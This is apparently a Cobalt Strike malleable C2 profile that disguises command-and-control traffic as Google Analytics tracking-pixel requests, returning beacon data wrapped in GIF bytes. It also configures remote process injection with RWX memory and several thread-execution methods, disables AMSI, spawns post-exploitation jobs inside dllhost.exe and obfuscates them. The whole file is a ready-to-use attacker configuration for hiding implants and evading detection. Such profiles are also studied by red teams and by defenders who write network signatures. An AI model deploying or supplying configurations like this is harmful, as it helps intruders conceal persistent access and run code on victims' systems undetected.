# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker

set tasks_max_size "2097152";
set sleeptime "2";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
set pipename "kraxsmb_###";
set tcp_port "6970";

process-inject {
        # set how memory is allocated in a remote process
        # VirtualAllocEx or NtMapViewOfSection. The
        # NtMapViewOfSection option is for same-architecture injection only.
        # VirtualAllocEx is always used for cross-arch memory allocations.

        set allocator "VirtualAllocEx";
        # shape the memory characteristics and content
        set min_alloc "16384";
        set startrwx "true";
        set userwx "false";
        transform-x86 {
        prepend "\x90\x90";
        }
        transform-x64 {
        # transform x64 injected content
        }
        # determine how to execute the injected code
        execute {
            CreateThread "ntdll.dll!RtlUserThreadStart";
            SetThreadContext;
            RtlCreateUserThread;
        }
}

post-ex {
        set amsi_disable "true";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set obfuscate "true";
}

http-get {
        set uri "/__utm.gif";
        client {
                parameter "utmac" "UA-2202604-2";
                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                metadata {
                        netbios;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }

        server {
                header "Content-Type" "image/gif";

                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b

                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

                        print;
                }
        }
}

http-post {
        set uri "/___utm.gif";
        client {
                header "Content-Type" "application/octet-stream";

                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }

                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                output {
                        print;
                }
        }

        server {
                header "Content-Type" "image/gif";

                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "image/gif";
        }
}